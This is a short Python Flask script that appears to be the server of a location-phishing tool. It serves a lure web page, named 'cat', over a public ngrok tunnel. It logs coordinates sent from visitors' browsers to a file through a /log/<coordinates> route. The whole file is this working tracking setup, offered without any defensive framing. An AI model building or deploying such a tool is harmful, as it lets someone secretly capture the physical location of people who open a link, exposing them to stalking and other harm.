# -*- coding: utf-8 -*-

from flask import Flask, send_from_directory
from os import system


app = Flask(
    __name__,
    static_folder = 'pages/'
)


@app.route('/')
def URLa():
    page_path = 'pages/' + app.config['PAGE']
    return send_from_directory(page_path, 'index.html')

@app.route('/log/<coordinates>')
def log(coordinates):
    with open('coordinates.log', 'a') as f:
        f.write(coordinates + '\n')
    return '', 200


if __name__ == '__main__':
    system('xterm -e ./ngrok http 80 & clear')
    app.config['PAGE'] = 'cat'
    app.run(port = 80, threaded = True)
